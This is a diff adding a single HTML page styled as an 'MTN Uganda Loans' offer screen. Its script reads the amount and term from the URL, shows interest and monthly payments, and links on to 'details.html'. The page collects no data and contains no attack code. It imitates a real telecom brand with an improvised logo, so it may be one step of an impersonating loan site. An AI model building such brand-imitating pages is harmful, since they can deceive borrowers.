@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Offer - MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow { font-size: 22px; color: #333; text-decoration: none; cursor: pointer; }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+        .card h1 {
+            font-size: 24px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .sub {
+            text-align: center; color: #888; font-size: 13px;
+            margin-bottom: 26px;
+        }
+
+        .offer-box {
+            border: 2px solid #ffcc00; border-radius: 14px;
+            overflow: hidden; margin-bottom: 22px;
+            background: #fffef8;
+        }
+
+        .offer-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 18px;
+            border-bottom: 1px solid #fef0c0;
+            font-size: 14px;
+        }
+        .offer-row:last-child { border-bottom: none; }
+
+        .offer-row .k { color: #555; font-weight: 600; }
+        .offer-row .v { color: #111; font-weight: 800; }
+
+        .offer-row.total .v { color: #d4a000; }
+
+        .offer-row.highlight {
+            background: #ffcc00; padding: 20px 18px;
+        }
+        .offer-row.highlight .k { color: #111; font-weight: 800; font-size: 15px; }
+        .offer-row.highlight .v { color: #111; font-weight: 900; font-size: 20px; }
+
+        .accept-btn {
+            width: 100%; background: #ffcc00; color: #111;
+            border: none; padding: 18px;
+            font-size: 16px; font-weight: 900; letter-spacing: 1.5px;
+            border-radius: 12px; cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s;
+            margin-bottom: 12px;
+            box-shadow: 0 6px 16px rgba(255,204,0,0.35);
+        }
+        .accept-btn:hover { background: #e6b800; }
+
+        .change-btn {
+            width: 100%; background: transparent; color: #666;
+            border: 2px solid #e5e5e5; padding: 15px;
+            font-size: 14px; font-weight: 800; letter-spacing: 1px;
+            border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; text-decoration: none;
+            display: inline-block; text-align: center;
+            transition: background 0.2s;
+        }
+        .change-btn:hover { background: #f4f4f4; }
+
+        .note {
+            font-size: 12px; color: #999; text-align: center;
+            margin-top: 18px; line-height: 1.5;
+        }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 21px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="apply.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Your Loan Offer</h1>
+            <p class="sub">Review the details before you proceed</p>
+
+            <div class="offer-box">
+                <div class="offer-row">
+                    <span class="k">Loan Amount</span>
+                    <span class="v" id="vAmount">UGX 0</span>
+                </div>
+                <div class="offer-row">
+                    <span class="k">Interest (8%)</span>
+                    <span class="v" id="vInterest">UGX 0</span>
+                </div>
+                <div class="offer-row total">
+                    <span class="k">Total to Repay</span>
+                    <span class="v" id="vTotal">UGX 0</span>
+                </div>
+                <div class="offer-row">
+                    <span class="k">Loan Term</span>
+                    <span class="v" id="vTerm">12 months</span>
+                </div>
+                <div class="offer-row">
+                    <span class="k">Due Date</span>
+                    <span class="v">1st of each month</span>
+                </div>
+                <div class="offer-row highlight">
+                    <span class="k">Monthly Payment</span>
+                    <span class="v" id="vMonthly">UGX 0</span>
+                </div>
+            </div>
+
+            <button class="accept-btn" onclick="acceptOffer()">Accept & Continue</button>
+            <a href="#" class="change-btn" onclick="changeAmount(event)">Change Amount</a>
+
+            <p class="note">No hidden fees. You'll only repay the amount shown above.</p>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const amount = Number(params.get('amount') || 500000);
+        const term   = Number(params.get('term')   || 12);
+
+        const interest = Math.round(amount * 0.08);
+        const total    = amount + interest;
+        const monthly  = Math.round(total / term);
+
+        function fmt(n) {
+            return 'UGX ' + Number(n).toLocaleString();
+        }
+
+        document.getElementById('vAmount').textContent   = fmt(amount);
+        document.getElementById('vInterest').textContent = fmt(interest);
+        document.getElementById('vTotal').textContent    = fmt(total);
+        document.getElementById('vTerm').textContent     = term + ' months';
+        document.getElementById('vMonthly').textContent  = fmt(monthly);
+
+        function acceptOffer() {
+            window.location.href = 'details.html?' + params.toString();
+        }
+
+        function changeAmount(e) {
+            e.preventDefault();
+            window.location.href = 'apply.html?' + params.toString();
+        }
+    </script>
+</body>
+</html>
